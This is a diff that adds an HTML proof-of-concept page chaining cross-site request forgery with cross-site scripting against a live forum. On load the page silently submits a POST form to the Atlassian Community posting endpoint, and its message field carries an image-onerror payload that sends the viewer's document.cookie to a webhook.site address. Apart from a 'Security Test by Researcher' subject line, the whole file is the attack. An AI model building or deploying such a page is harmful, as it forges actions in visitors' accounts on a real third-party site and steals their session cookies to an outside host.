@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <body onload="document.forms[0].submit()">
+    <form action="https://community.atlassian.com/t5/forums/postpage/board-id/jira-questions" method="POST">
+      <!-- Subject field -->
+      <input type="text" name="subject" value="Security Test by Researcher" />
+
+      <!-- Message field (XSS Payload) -->
+      <input type="text" name="message" value='<img src=x onerror="new Image().src=`https://webhook.site/61b27002-7008-41c4-a208-b0386c669f3b?cookie=${document.cookie}`">' />
+
+      <!-- Body field (Optional) -->
+      <input type="hidden" name="body" value="Test Body Content" />
+    </form>
+  </body>
+</html>
